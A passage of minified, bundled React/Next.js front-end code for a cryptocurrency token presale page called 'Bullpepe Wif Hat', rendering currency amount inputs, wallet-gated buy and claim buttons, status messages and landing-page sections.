                                      aV.isLoading) &&
                                      (0, t.jsxs)("div", {
                                        className: "lds-ellipsis",
                                        children: [
                                          (0, t.jsx)("div", {}),
                                          (0, t.jsx)("div", {}),
                                          (0, t.jsx)("div", {}),
                                          (0, t.jsx)("div", {}),
                                        ],
                                      }),
                                  ],
                                }),
                                (0, t.jsx)("div", { className: "row" }),
                              ],
                            }),
                          }),
                          (aM.isError || aJ.isError || aV.isError) &&
                            (0, t.jsx)("div", {
                              className: "textStatus error",
                              children: sa("buy_error"),
                            }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "Container",
                        children: [
                          (0, t.jsxs)("span", {
                            className: "LeftContent",
                            children: [
                              sa("buy_frame.amount"),
                              " ",
                              (0, t.jsx)("b", { children: ez }),
                              " ",
                              sa("buy_frame.amount_out"),
                            ],
                          }),
                          (0, t.jsx)("div", {
                            className: "RightContent",
                            onClick: () => {
                              var e =
                                parseFloat(
                                  (null == aB ? void 0 : aB.value) + ""
                                ) /
                                parseFloat("10") **
                                  parseFloat(
                                    "USDT" === ez && "ETH" === e6 ? 6 : "18"
                                  );
                              e <= 0 ||
                                ("ETH" == ez
                                  ? (null == aB ? void 0 : aB.value) >=
                                    0.003 * 1e18
                                    ? (e -= 0.003)
                                    : (e = 0)
                                  : "BNB" == ez &&
                                    ((null == aB ? void 0 : aB.value) >=
                                    0.017 * 1e18
                                      ? (e -= 0.017)
                                      : (e = 0)),
                                se(e));
                            },
                            children: "MAX",
                          }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "container center maxwidthBuyFrame",
                        children: [
                          (0, t.jsx)("input", {
                            className: "inputAmount textBold",
                            type: "text",
                            value: ep,
                            placeholder: "0",
                            onChange: (e) => {
                              let a = e.target.value;
                              /^\d*\.?\d*$/.test(a) &&
                                (a.match(/\./g) || []).length <= 1 &&
                                ("" === a ? aI() : se(a));
                            },
                          }),
                          (0, t.jsx)(L(), {
                            className: "iconToken",
                            src: eA,
                            alt: "Paris",
                          }),
                        ],
                      }),
                      (0, t.jsx)("div", {
                        className: "Container",
                        children: (0, t.jsxs)("span", {
                          className: "LeftContent",
                          children: [
                            sa("buy_frame.amount"),
                            " ",
                            (0, t.jsx)("b", { children: "BIF" }),
                            " ",
                            sa("buy_frame.amount_in"),
                          ],
                        }),
                      }),
                      (0, t.jsxs)("div", {
                        className: "container maxwidthBuyFrame",
                        children: [
                          (0, t.jsx)("input", {
                            id: "ipAmountReceive",
                            type: "text",
                            placeholder: "0",
                            className: "inputAmount textBold300",
                            value: eb,
                            onChange: (e) => {
                              let a = e.target.value;
                              if (
                                /^\d*\.?\d*$/.test(a) &&
                                (a.match(/\./g) || []).length <= 1
                              ) {
                                if ("" === a) aI();
                                else {
                                  let s = parseFloat(e.target.value);
                                  if ((eg(a), ef(s), "ETH" == ez)) {
                                    let e =
                                        parseFloat(aP() + "") /
                                        parseFloat(e_ + ""),
                                      a = s * e;
                                    ev(a), ej(a.toFixed(5));
                                  } else if ("USDT" == ez) {
                                    let e =
                                        parseFloat(aP() + "") /
                                        parseFloat(eC + ""),
                                      a = s * e;
                                    ev(parseFloat(a + "")), ej(a.toFixed(2));
                                  } else if ("BNB" == ez) {
                                    let e =
                                        parseFloat(aP() + "") /
                                        parseFloat(eT + ""),
                                      a = s * e;
                                    ev(parseFloat(a + "")), ej(a.toFixed(2));
                                  }
                                }
                              }
                            },
                          }),
                          (0, t.jsx)(L(), {
                            className: "iconTokenPepe",
                            src: f.Z,
                            alt: "Paris",
                          }),
                        ],
                      }),
                      (0, t.jsx)("div", {
                        className: "buyButton center-container",
                        onClick: function () {
                          if (!e1) {
                            Y.ZP.error("Let connect to wallet");
                            return;
                          }
                          if ((ag(""), "ETH" == e6 && 1 != e9.id)) {
                            aS(1);
                            return;
                          }
                          if ("BSC" == e6 && 56 != e9.id) {
                            aS(56);
                            return;
                          }
                          af(!1), aA(!1);
                        },
                        children: sa("buy_frame.buy"),
                      }),
                      !1,
                      (0, t.jsxs)("div", {
                        className: "buyButton center-container",
                        onClick: a8,
                        children: [sa("buy_frame.claim"), " "],
                      }),
                      !1,
                      (0, t.jsxs)("div", {
                        children: [
                          a6.isLoading &&
                            (0, t.jsxs)("div", {
                              className: "row center-container",
                              children: [
                                (0, t.jsx)("div", {
                                  className: "textStatus",
                                  children: sa("buy_frame.Claiming"),
                                }),
                                (0, t.jsxs)("div", {
                                  className: "lds-ellipsis",
                                  children: [
                                    (0, t.jsx)("div", {}),
                                    (0, t.jsx)("div", {}),
                                    (0, t.jsx)("div", {}),
                                    (0, t.jsx)("div", {}),
                                  ],
                                }),
                              ],
                            }),
                          a6.isError &&
                            (0, t.jsxs)("div", {
                              className: "textStatus error center-container",
                              children: [
                                sa("claim_error"),
                                " ",
                                null === (ec = a6.data) || void 0 === ec
                                  ? void 0
                                  : ec.status,
                              ],
                            }),
                          a6.isSuccess &&
                            (0, t.jsx)("div", {
                              className: "textStatus success center-container",
                              children: sa("buy_frame.Claimed"),
                            }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "margin_top",
                        children: [
                          (0, t.jsx)("span", {
                            className: "smalltext",
                            children: sa("powered"),
                          }),
                          (0, t.jsxs)("a", {
                            href: "mailto: web3payment@bullpepewifhat.xyz",
                            onClick: function () {
                              (window.location.href =
                                "mailto: web3payment@bullpepewifhat.xyz"),
                                (0, X.Kz)(a_, "handle_click_powerd_by");
                            },
                            children: [
                              " ",
                              (0, t.jsx)("span", {
                                className: "powered",
                                children: "Bullpepe Wif Hat",
                              }),
                              " ",
                            ],
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
            }),
            (0, t.jsx)("p", {}),
            (0, t.jsx)("div", { className: "container-about" }),
            (0, t.jsx)("section", {
              id: "about",
              children: (0, t.jsxs)("div", {
                children: [" ", (0, t.jsx)(K.k, {})],
              }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("section", {
              id: "about",
              children: (0, t.jsxs)("div", {
                children: [" ", (0, t.jsx)(r.C, {})],
              }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("section", {
              id: "howtobuy",
              className: "center maxwidth40",
              children: (0, t.jsx)("div", {
                className: "center maxwidth40",
                children: (0, t.jsx)(J.L, {}),
              }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("div", {
              className: "bg_wafle bg_left",
              style: { backgroundImage: "url(".concat(B.Z.src, ")") },
              children: (0, t.jsx)("div", {
                className: "info1 center center-container container-about",
                children: (0, t.jsx)("section", {
                  id: "howtobuy",
                  className: "center maxwidth40",
                  children: (0, t.jsx)("div", {
                    className: "center maxwidth40",
                    children: (0, t.jsx)(i.T, {}),
                  }),
                }),
              }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("div", {
              className: "bg_wafle bg_right",
              style: { backgroundImage: "url(".concat(T.Z.src, ")") },
              children: (0, t.jsx)("div", {
                className: "info1 center center-container container-about",
                children: (0, t.jsx)("section", {
                  id: "staking",
                  className: "center maxwidth40",
                  children: (0, t.jsx)("div", {
                    className: "center maxwidth40",
                    children: (0, t.jsx)(z.T, {}),
                  }),
                }),
              }),
            }),
            (0, t.jsx)("p", {}),
            (0, t.jsx)("p", {}),
            (0, t.jsx)(L(), { className: "imageSmall", src: y.Z }),
            (0, t.jsx)("div", {
              className: "bg_wafle bg_right",
              style: { backgroundImage: "url(".concat(T.Z.src, ")") },
              children: (0, t.jsx)("section", {
                id: "tokenomics",
                className: "center  width100 maxwidth40 margin_top1em",
                children: (0, t.jsx)("div", { children: (0, t.jsx)(l.w, {}) }),
              }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("section", {
              id: "roadmap",
              className: "center",
              children: (0, t.jsx)("div", { children: (0, t.jsx)(c.w, {}) }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("section", {
              id: "faq",
              className: "center container-about",
              children: (0, t.jsx)("div", { children: (0, t.jsx)(U.B, {}) }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)(Z.p, {}),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)(I.r, {}),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)(A.E, {}),
            (0, t.jsx)("div", {
              children: (0, t.jsx)(L(), {
                className: "imagelarge margin_top2em margin_bottom2em",
                src: w.Z,
              }),
            }),
            (0, t.jsx)("div", {
              className: "bg_wafle bg_left",
              style: { backgroundImage: "url(".concat(B.Z.src, ")") },
              children: (0, t.jsx)("section", {
                id: "contact",
                className: "center maxwidth40 minwidth",
                children: (0, t.jsx)("div", { children: (0, t.jsx)(d.r, {}) }),
              }),
            }),
            (0, t.jsx)("div", { className: "divider div-transparent" }),
            (0, t.jsx)("section", {
              id: "footer",
              children: (0, t.jsx)("div", {
                className: "center",
                children: (0, t.jsx)(o.$, {}),
              }),
            }),
            (0, t.jsx)("div", { className: "row" }),
          ],
        });
      }
    },
  },
  function (e) {
    e.O(0, [627, 323, 764, 760, 96, 351, 50, 774, 888, 179], function () {
      return e((e.s = 45728));
    }),
      (_N_E = e.O());
  },
]);
